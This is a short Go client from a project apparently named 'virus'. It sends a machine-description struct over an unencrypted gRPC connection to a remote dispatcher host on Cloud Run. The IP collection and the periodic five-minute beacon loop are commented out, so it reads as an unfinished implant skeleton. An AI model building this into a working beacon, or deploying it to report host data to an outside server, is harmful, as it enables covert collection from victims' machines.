package main

import (
	"context"
	"fmt"
	"time"

	"google.golang.org/grpc"

	"github.com/kolya59/virus/pkg/machine"
	pb "github.com/kolya59/virus/proto"
)

const (
	dispatcherCert = "worker.crt"
	dispatcherHost = "dispatcher-server-eujhpoji7a-ew.a.run.app"
	dispatcherPort = "8080"
)

var (
	interval = 5 * time.Minute
	timeout  = 60 * time.Minute
)

func sendData(machine machine.Machine, done chan interface{}) {
	// Convert to grpc
	converted := machine.ToGRPC()

	/*// Create the client TLS credentials
	creds, err := credentials.NewServerTLSFromFile(dispatcherCert, "")
	if err != nil {
		return
	}*/

	// Set up a connection to the worker.
	conn, err := grpc.Dial(fmt.Sprintf("%s:%s", dispatcherHost, dispatcherPort), grpc.WithInsecure())
	if err != nil {
		return
	}
	defer conn.Close()

	// Initialize the client
	c := pb.NewFunctionDispatcherClient(conn)

	// Save cars
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	r, err := c.SaveMachine(ctx, &pb.SaveMachineReq{Machine: converted})
	if err != nil {
		return
	}

	if r.Status != pb.SaveMachineRes_ACCEPTED {
		close(done)
	}
}

func main() {
	m := machine.Machine{}
	// m.GetIPS()

	done := make(chan interface{})
	/*ticker := time.NewTicker(interval)
	timer := time.NewTimer(timeout)*/

	sendData(m, done)
	/*for {
		select {
		case <-ticker.C:
			sendData(m, done)
		case <-timer.C:
			return
		case <-done:
			return
		}
	}*/
}
